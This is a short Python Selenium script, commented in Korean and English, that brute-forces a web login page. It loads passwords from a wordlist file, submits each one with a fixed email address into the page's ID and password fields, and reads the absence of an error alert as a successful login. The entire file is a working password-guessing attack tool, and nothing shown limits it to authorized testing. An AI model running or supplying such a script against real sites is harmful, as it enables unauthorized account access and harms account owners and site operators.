from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from time import sleep
from selenium.webdriver.common.keys import Keys
from itertools import cycle
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.alert import Alert
from selenium.common.exceptions import TimeoutException

 
driver = webdriver.Chrome("./chromedriver.exe") # 크롬드라이버 경로 chromedriver path
u = 'url' #로그인 URL 입력 input login URL
driver.get(u)

#파일을 불러와서 배열로 만듬 Create an array with a wordlist
file_path = "./login.txt"

with open(file_path) as f:
    wordlist = f.read().splitlines()

#직접 배열을 만듬 Create direct array
#wordlist=['1', '2', '3', '4', '5'] #txt 안할 시 사용
driver.implicitly_wait(10)
licycle = cycle(wordlist)
cu = driver.current_url

while True:
        
        driver.implicitly_wait(5)
        nextp = next(licycle)
        sleep(1)
        A = "//input[@name='A']" #ID 구분자 입력
        input_window = driver.find_element_by_xpath(A)
        input_window.send_keys ("hyotwo@test.com")
        sleep(1)
        B = "//input[@name='B']" #PW 구분자 입력
        input_window = driver.find_element_by_xpath(B)
        input_window.send_keys (nextp+"\n")
        print("\033[91m"+"패스워드 입력 : " +"\033[94m"+ nextp + "\033[0m")
        
        try:
            WebDriverWait(driver, 3).until(EC.alert_is_present(),
                                   'Timed out waiting for PA creation ' +
                                   'confirmation popup to appear.')

            alert = driver.switch_to.alert
            alert.accept()
            print("\033[33m"+"로그인 실패"+"\033[0m")
            print(driver.title +" ----- "+ cu)
        except TimeoutException:
            print("\033[32m"+"로그인 성공 종료합니다."+"\033[0m")
            print(driver.title)
            break
        input_window = driver.find_element_by_xpath(A)
        input_window.send_keys (Keys.CONTROL + "a") 
        input_window.send_keys (Keys.DELETE) 
        input_window = driver.find_element_by_xpath(B)
        input_window.send_keys (Keys.CONTROL + "a") 
        input_window.send_keys (Keys.DELETE)
        
    
    
    
